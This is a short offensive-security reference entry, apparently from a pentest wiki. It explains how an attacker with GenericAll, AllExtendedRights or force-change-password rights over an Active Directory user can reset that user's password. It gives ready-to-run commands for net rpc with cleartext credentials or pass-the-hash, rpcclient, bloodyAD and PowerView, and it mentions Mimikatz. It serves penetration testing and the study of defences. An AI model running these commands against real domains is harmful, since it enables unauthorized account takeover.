This abuse can be carried out when controlling an object that has a `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` over the target user.
=== "UNIX-like"
    It can also be achieved from UNIX-like system with [net](https://linux.die.net/man/8/net), a tool for the administration of samba and cifs/smb clients. The [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) can also be used to run net commands with pass-the-hash.
    ```bash
    # With net and cleartext credentials (will be prompted)
    net rpc password "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"

    # With net and cleartext credentials
    net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"

    # With Pass-the-Hash
    pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
    ```
    The [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) can also be used on UNIX-like systems when the package samba-common-bin is missing.
    ```bash
    rpcclient -U $DOMAIN/$ControlledUser $DomainController
    rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
    ```
    Alternatively we can use BloodyAD instead
    ```bash
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
    ```
=== "Windows"
    The attacker can change the password of the user. This can be achieved with Set-DomainUserPassword (PowerView module).
    ```bash
    $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
    ```
    Mimikatz's `lsadump::setntlm` can also be used for that purpose.